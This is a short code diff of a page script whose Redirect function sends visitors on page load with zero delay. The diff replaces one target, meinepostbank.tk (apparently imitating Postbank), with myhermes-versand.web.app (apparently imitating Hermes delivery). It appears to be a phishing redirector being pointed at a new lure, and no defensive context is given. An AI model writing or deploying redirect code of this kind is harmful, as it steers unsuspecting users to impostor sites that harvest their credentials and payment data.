@@ -17,7 +17,7 @@
 
  function Redirect() 
     {  
-        window.location="https://meinepostbank.tk"; 
+        window.location="https://myhermes-versand.web.app"; 
     } 
     document.write(""); 
     setTimeout('Redirect()', 0);   
